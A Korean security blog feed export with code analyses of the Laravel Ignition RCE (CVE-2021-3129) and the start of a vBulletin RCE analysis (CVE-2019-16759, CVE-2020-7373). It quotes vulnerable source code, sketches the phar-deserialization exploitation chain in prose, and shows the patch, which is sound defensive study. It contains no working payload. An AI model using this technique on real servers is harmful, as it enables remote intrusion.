str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">        <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">generateExpectedTokens</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$originalTokens</span>, <span class="keyword">string</span> <span class="variable">$variableName</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$expectedTokens</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$originalTokens</span> <span class="keyword">as</span> <span class="variable">$token</span>) &#123;</span><br><span class="line">            <span class="variable">$expectedTokens</span>[] = <span class="variable">$token</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$token</span>[<span class="number">0</span>] === T_VARIABLE &amp;&amp; <span class="variable">$token</span>[<span class="number">1</span>] === <span class="string">&#x27;$&#x27;</span>.<span class="variable">$variableName</span>) &#123;</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_COALESCE, <span class="string">&#x27;??&#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_CONSTANT_ENCAPSED_STRING, <span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$expectedTokens</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위 요청 헤더에서 sollution이 가르키는 <code>MakeViewVariableOptionalSolution</code> 클래스를 보면 run() 메서드에서 makeOptional() 메서드를 호출하는 것을 볼 수 있고, makeOptional() 메서드에 값으로 $parameters를 그대로 넘겨주고 있는 것을 볼 수 있습니다. (Facade\Ignition\Solutions\MakeViewVariableOptionalSolution)<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">    <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>makeOptional() 메서드를 보면 file_get_contents() 메서드를 호출하는 데 이때 입력값인 <code>viewFile</code>(임의의 값을 넣어줄 수 있음)를 넘겨주고 있는 것을 볼 수 있습니다. 그리고 <code>$originalContents</code>에서 <code>&#39;$&#39;.$parameters[&#39;variableName&#39;]</code>을 <code>&#39;$&#39;.$parameters[&#39;variableName&#39;].&quot; ?? &#39;&#39;&quot;</code>로 replace 시키고, 2개의 값을 이용해서 토큰 2개를 생성하는 것을 볼 수 있습니다. 그리고 생성된 두개의 토큰이 다르 false를 반환하고, 같은 $newContents를 반환하는 것을 볼 수 있습니다.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$newContents가 리턴이 되었다면 $newContents의 값을 file_put_contents() 메서드를 이용해서 $parameters[‘viewFile’]로 값을 넣어 파일을 생성하고 . 감이 오셨나요? 여기서 file_get_contents(), file_put_contents() 메서드의 인자값에 대한 검증이 존재하지 않아 우리가 원하는 값을 마음대로 삽입할 수 있습니다.<br><br></p><p>연구원은 이를 이용해서 PHP Wrapper을 이용해 log 파일을 체이닝 시켜, 마지막에 phar Wrapper를 이용해서 역직렬화 RCE를 트리거 하였습니다. log 파일을 체이닝 할 때는 base64, utf-8, utf-16 등을 이용해서 체이닝을 해준 것으로 보입니다.<br></p><hr><h2 id="CVE-2021-3129-Patch"><a href="#CVE-2021-3129-Patch" class="headerlink" title="CVE-2021-3129 Patch"></a><em>CVE-2021-3129 Patch</em></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /ignition-2.5.2/ignition-2.5.2/src/Solutions/MakeViewVariableOptionalSolution.php</span></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isSafePath</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$path</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! Str::startsWith(<span class="variable">$path</span>, [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;./&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! Str::endsWith(<span class="variable">$path</span>, <span class="string">&#x27;.blade.php&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;isSafePath(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line">        <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">        <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">generateExpectedTokens</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$originalTokens</span>, <span class="keyword">string</span> <span class="variable">$variableName</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$expectedTokens</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$originalTokens</span> <span class="keyword">as</span> <span class="variable">$token</span>) &#123;</span><br><span class="line">            <span class="variable">$expectedTokens</span>[] = <span class="variable">$token</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$token</span>[<span class="number">0</span>] === T_VARIABLE &amp;&amp; <span class="variable">$token</span>[<span class="number">1</span>] === <span class="string">&#x27;$&#x27;</span>.<span class="variable">$variableName</span>) &#123;</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_COALESCE, <span class="string">&#x27;??&#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_CONSTANT_ENCAPSED_STRING, <span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$expectedTokens</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CVE-2021-3129 Patch 노트가 따로 존재하지 않아 패치 버전인 Ignition 2.5.2의 코드를 직접 확인해보았습니다. <code>makeOptional()</code> 메서드를 보면 기존에는 존재하지 않던 <code>$parameters[&#39;viewFile&#39;]</code>의 값을 <code>isSafePath()</code> 메서드를 이용해서 검증하고 있는 것을 볼 수 있습니다.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isSafePath</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$path</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! Str::startsWith(<span class="variable">$path</span>, [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;./&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! Str::endsWith(<span class="variable">$path</span>, <span class="string">&#x27;.blade.php&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isSafePath()</code> 메서드를 보면 ‘/‘, ‘./‘로 시작하지 않거나, 마지막에 .blade.php가 아니면 false를 리턴하는 것을 볼 수 있습니다. 위 2개의 검증 로직이 추가되므로 항상 viewFile의 값이 <code>/work/pentest/laravel/laravel/resources/views/hello.blade.php</code>일 때 정상 작동하게 되었고, 개발자가 의도하지 않은 값이 <code>viewFile</code>로 들어오게 되면 아무 일도 일어나지 않게 되며 CVE-2021-3129 취약점을 패치하였습니다.<br></p><p>매번 느끼지만 PHP에서는 끊임 없이 취약점이 나오고 있네요. 앞으로도 PHP를 사용하고 있는 웹 프레임워크나 여러 프로그램에서 취약점이 더 수두룩 나올 거 같습니다.<br></p><hr>]]></content>
      
      
      <categories>
          
          <category> Analysis </category>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0-day RCE in vBulletin</title>
      <link href="2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/"/>
      <url>2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/</url>
      
        <content type="html"><![CDATA[<p>vBulletin에서 발견된 0-day 취약점을 분석해보겠습니다. vBulletin은 외국에서 사용하는 포럼 툴이라고 합니다. 한국 말로 풀어 쓰면 토론형 게시판이라고 볼 수 있겠습니다. 여하튼 이 포럼 툴에서 RCE 취약점이 총 2번 발견 되었습니다.</p><table><thead><tr><th>CVE ID</th><th>Version</th><th>CVSS</th></tr></thead><tbody><tr><td>CVE-2019-16759</td><td>5.x ~ 5.5.4</td><td>9.8</td></tr><tr><td>CVE-2020-7373</td><td>5.5.4 ~ 5.6.2</td><td>9.8</td></tr></tbody></table><p>처음에는 <code>CVE-2019-16759</code>라는 취약점이 나왔었고, 취약한 버전은 5.x부터 5.5.4까지라고 합니다. 해당 취약점은 9월 24일에 처음 POC가 공개되었고, 바로 다음 날인 25일에 패치가 됐다고 합니다.</p><p>하지만 완전히 패치된 줄 알았던 0-day 취약점이 한 보안 연구원에 의해서 또 다시 뚫리고 말았습니다. <code>CVE-2020-7373</code>라는 CVE ID로 나왔었고, 취약한 버전은 5.5.4부터 5.6.2까지라고 합니다. 그럼 한 번 RCE가 어떻게 트리거 됐는지 코드 분석을 통해 알아보겠습니다.</p><hr><h2 id="CVE-2019-16759"><a href="#CVE-2019-16759" class="headerlink" title="CVE-2019-16759"></a>CVE-2019-16759</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="comment">//For a few set routes we can run a streamlined funcction.</span></span><br><span class="line"><span class="keyword">if</span> (vB5_Frontend_ApplicationLight::isQuickRoute())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$app</span> = vB5_Frontend_ApplicationLight::init(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$app</span>-&gt;execute())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p>취약점의 시작은 index.php에서 시작이 됩니다. <code>isQuickRoute()</code>의 값이 참이면 if 문 내부로 들어가는 것을 볼 수 있습니다. isQuickRoute 메서드는 <code>includes/vb5/frontend/applicationlight.php</code> 내부에 정의되어 있습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Tells whether this class can process this request</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> boll</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">isQuickRoute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$quickRoutes</span>[<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]]))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>], <span class="number">0</span>, <span class="number">8</span>) == <span class="string">&#x27;ajax/api&#x27;</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>], <span class="number">0</span>, <span class="number">11</span>) == <span class="string">&#x27;ajax/render&#x27;</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>includes/vb5/frontend/applicationlight.php</code> 내부에는 위와 같이 isQuickRoute 메서드가 정의되어 있는데 routestring의 값이 <code>&#39;ajax/api&#39;</code>, <code>&#39;ajax/render&#39;</code>이면 ture를 반환해 vB5_Frontend_ApplicationLight::init가 실행이 됩니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**Standard constructor. We only access application throuth init() **/</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring]))</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            return false;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if (isset(self::$quickRoutes[$_REQUEST[&#x27;</span>routestring<span class="string">&#x27;]]))</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = self::$quickRoutes[$_REQUEST[&#x27;</span>routestring]];</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring], 0, 8) == &#x27;</span>ajax/api<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = array(&#x27;</span>handler<span class="string">&#x27; =&gt; &#x27;</span>handleAjaxApi<span class="string">&#x27;, &#x27;</span><span class="built_in">static</span><span class="string">&#x27; =&gt; false);</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            if (substr($_REQUEST[&#x27;</span>routestring<span class="string">&#x27;], 0, 17) == &#x27;</span>ajax/api/cron/run<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                $this-&gt;application[&#x27;</span>runcron<span class="string">&#x27;] = true;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            return true;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if (substr($_REQUEST[&#x27;</span>routestring<span class="string">&#x27;], 0, 11) == &#x27;</span>ajax/render<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = array(&#x27;</span>handler<span class="string">&#x27; =&gt; &#x27;</span>callRender<span class="string">&#x27;, &#x27;</span><span class="built_in">static</span><span class="string">&#x27; =&gt; false);</span></span><br><span class="line"><span class="string">            return true;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        return false;  </span></span><br><span class="line"><span class="string">    &#125;    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(생략)</span></span><br></pre></td></tr></table></figure><p>index.php에서 vB5_Frontend_ApplicationLight::init 메서드가 실행되면 위 <code>__construct</code> 메서드가 실행됩니다. 코드 하단에 보면 <code>routestring</code>의 값이 <code>&#39;ajax/render&#39;</code>이면 handler로 callRender 메서드가 설정되어 있는 것을 볼 수 있습니다. callRender 메서드도 <code>includes/vb5/frontend/applicationlight.php</code> 내부에 정의되어 있습니다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** This renders a template from an ajax call</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">callRender</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$routeInfo</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (count(<span class="variable">$routeInfo</span>) &lt; <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> vB5_Exception_Api(<span class="string">&#x27;ajax&#x27;</span>, <span class="string">&#x27;api&#x27;</span>, <span class="keyword">array</span>(), <span class="string">&#x27;invalid_request&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$params</span> = array_merge(<span class="variable">$_POST</span>, <span class="variable">$_GET</span>);</span><br><span class="line">        <span 